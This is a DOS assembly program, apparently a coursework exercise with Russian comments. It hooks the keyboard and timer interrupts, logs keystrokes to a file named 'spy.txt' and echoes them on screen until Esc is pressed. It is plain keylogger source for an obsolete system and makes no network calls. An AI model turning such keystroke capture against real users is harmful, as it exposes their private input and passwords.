Data segment
    time dw 100              ;переменная таймера 18,2 сигнаа в секунду (5 секунд - это 91 прерываение)
    txt  db " ", 13,10,"$"
    cnt  dw 10              ;для счетчика смещения
    SAVE_CS DW 0            ;сохраняем сегмент заменяемого прерывания
    SAVE_IP DW 0            ;сохраняем смещение прерывания
	SAVE_CS2 DW 0            ;сохраняем сегмент заменяемого прерывания
    SAVE_IP2 DW 0            ;сохраняем смещение прерывания
    tmp dw 0
	dir1 db "c:\Tasm\Tasks",0
	dir2 db "c:\Tasm",0
	str1 db "spy.txt",0
	inp1 db "Writed to file. $"
	handler1 dw ?
	buffer db 255 dup (?)
	count dw 0
	t dw 0

	TABLE1 DB 0,0,'1234567890-=',0,0 ;первые 16 клавиш
	DB 'qwertyuiop[]',0,0	;верхний ряд клавиатуры
	DB "asdfghjkl;'`",0,"\"	;средний ряд клавиатуры
	DB 'zxcvbnm,./',0,0,0,' '	;нижний ряд клавиатуры
	DB 9 DUP(0)	;пропуск до верхнего регистра
	DB 'QWERTYUIOP',0,0,0,0	;те же символы на верхнем
	DB 'ASDFGHJKL',0,0,0,0,0	;регистре
	DB 'ZXCVBNM'

Data ends
 
code segment
start: assume cs:code, ds: data, es:stk
	mov ax, data
	mov ds, ax

	lea dx,dir1         ;change directory
	mov ah,3bh
	int 21h

	lea dx,str1         ;create new file
	mov ah,3ch
	xor cx,cx
	int 21h
	mov handler1, ax
	mov count, 0

                        ;сохраняем вектор - сохраняем исходные прерывания
    mov AH, 35h         ;функция получения вектора
    mov AL, 8h          ;номер вектора
    int 21h             ;
    mov SAVE_IP, BX     ;запоминаем смещение в BX
    mov SAVE_CS, ES     ;запоминаем сегмент в ES

    mov AH, 35h         ;функция получения вектора
    mov AL, 9h          ;номер вектора
    int 21h             ;
    mov SAVE_IP2, BX     ;запоминаем смещение в BX
    mov SAVE_CS2, ES     ;запоминаем сегмент в ES
 
    push DS
    mov DX, offset rout      ;смещение для процедуры в DX
    mov AX, seg rout        ;помещаем сегмент процедуры в DS
    mov DS, AX
    mov AH, 25h         ;в AH-> функцию установки вектора
    mov AL, 8h          ;в AL-> номер вектора
    int 21h             ;т.е. поменяли прерывание
	mov DX, offset new9      ;смещение для процедуры в DX
    mov AX, seg new9        ;помещаем сегмент процедуры в DS
    mov DS, AX
    mov AH, 25h         ;в AH-> функцию установки вектора
    mov AL, 9h          ;в AL-> номер вектора
    int 21h             ;т.е. поменяли прерывание
    pop DS
 
B:
cmp t,1
jne work

    CLI          ;восстанавливаем исходный вектор
    push DS
    mov DX, SAVE_IP
    mov AX, SAVE_CS
    mov DS, AX
    mov AH, 25h
    mov AL, 8h
    int 21h
    pop DS
    STI
	CLI               ;восстанавливаем исходный вектор
    push DS
    mov DX, SAVE_IP2    
    mov AX, SAVE_CS2
    mov DS, AX
    mov AH, 25h
    mov AL, 9h
    int 21h
    pop DS
    STI

	mov ah, 3eh             ;close result file
	mov bx, handler1
	int 21h
	lea dx,dir2             ;change directory
	mov ah,3bh
	int 21h
	mov ah, 4ch
	int 21h

work:
jmp B
 
rout proc far
    push AX             ;сохраняем все измененные регистры
    push DX
    dec time
    cmp time, 0
    jnz nxt
	dec cnt
	mov AX, 100             ;;;;;;;;;;;;;кол-во сек
	mov time, AX
	inc BX          
	inc tmp      
	mov AX, tmp
	mul tmp
    

	LEA DX, inp1             ;write
	MOV AH,09h 
	INT 21H 		
	mov ah,40h               ; записать в файл
	mov cx, count
	mov dx, offset buffer         ; из буфера в DS:DX
	mov bx, handler1
	int 21h
	mov bx,count
	mov buffer[bx], '$'
	LEA DX,buffer    ;input result 
	MOV AH,09h 
	INT 21H
	mov count, 0
	mov AH, 9h        ;new row
	lea DX, txt 
	int 21h
nxt:
    mov AL, 20h         ;аппартаное прерывание 
    out 20h, AL         ;
	pop DX
    pop AX              ;восстановили регистры
    iret                ;для восстановления сохраненных командой int регистров флагов
rout endp


new9 proc far
    push ds si es di dx cx bx ax           ; в стек регистры       
	xor ax, ax 
	IN AL,60H	          ;получаем скан-код из порта A
	cmp al,01h
	jne not_esc
	mov t,1
	not_esc:
	MOV AH,AL	          ;помещаем копию в AH
	PUSH AX	              ;сохраняем скан-код
	IN AL,61H	          ;читаем состояние порта B
	OR AL,10000000B	      ;устанавливаем бит 7
	OUT 61H,AL	          ;посылаем измененный байт в порт
	AND AL,01111111B	  ;сбрасываем бит 7
	OUT 61H,AL	          ;возвращаем состояние порта B	                      
	MOV AX,40H	          ;устанавливаем сегмент
	MOV ES,AX	          ;ES должен указывать на область данных BIOS
	POP AX	              ;возвращаем скан-код из стека
	TEST AL,10000000B	  ;код освобождения клавиши?
	;JNZ exit
	jz notosv
	mov     al,20H             ;послать сигнал "конец прерывания"
	out     20H,al             ; контроллеру прерываний 8259
	pop ax bx cx dx di es si ds
    iret
notosv:
	cmp al,1ch                     ;Enter
	jnz label1
	mov bx,count
	mov buffer[bx], 'E'
	mov buffer[bx+1], 'n'
	mov buffer[bx+2], 't'
	mov buffer[bx+3], 'e'
	mov buffer[bx+4], 'r'
	add count,5
	jmp exit
label1:
	cmp al,38h                   ;Alt
	jnz label2
	mov bx,count
	mov buffer[bx], 'A'
	mov buffer[bx+1], 'l'
	mov buffer[bx+2], 't'
	add count,3
	jmp exit
label2:
	cmp al,1dh                       ;ctrl
	jnz label3
	mov bx,count
	mov buffer[bx], 'C'
	mov buffer[bx+1], 't'
	mov buffer[bx+2], 'r'
	mov buffer[bx+3], 'l'
	add count,4
	jmp exit
label3:
	cmp al,2ah                    ;shift
	jnz label4
	mov bx,count
	mov buffer[bx], 'S'
	mov buffer[bx+1], 'h'
	mov buffer[bx+2], 'i'
	mov buffer[bx+3], 'f'
	mov buffer[bx+4], 't'
	add count,5
	jmp exit
label4:
	MOV BX,OFFSET TABLE1  ;готовим таблицу
	XLAT TABLE1
	mov bx,count
	mov buffer[bx], al
	inc count
	exit:	
	mov     al,20H             ;послать сигнал "конец прерывания"
	out     20H,al             ; контроллеру прерываний 8259
	pop ax bx cx dx di es si ds
    iret
new9 endp




 
 
PrintNumber proc        ;процедура показа числа из AX
    push BX             ;сохраняем содержимое регистров в стек, чтобы потом вернуть их
    push DX
    push SI
    push CX
    mov CX, 0           ;инициализируем цикл
    mov BX, 10          ;в BX заносим основание системы счисления
loophere:               ;основной цикл
    mov DX, 0           ;обнуляем DX
    div BX              ;делим на 10
    
    push AX             ;результат в стеке
    add DL, "0"         ;конвертируем последнюю цифру в ASCII-код
 
    pop AX              ;вернем AX
    push DX             ;сохраним DX
    inc CX              ;увеличим CX на 1
    cmp AX, 0           ;повторяем для всех цифр числа
jnz loophere
    mov AH, 2           ;DOS-функция вывода символа
loophere2:
    pop DX              ;восстанавливливаем цифры от последней к первой и 
    mov AH, 02h         ;выводим их на экран
	int 21h
loop loophere2
    pop CX
    pop SI
    pop DX
    pop BX
     ret
PrintNumber endp            
 
code ends
    
stk segment stack
        db 256 dup ("*")
stk ends
 
end start
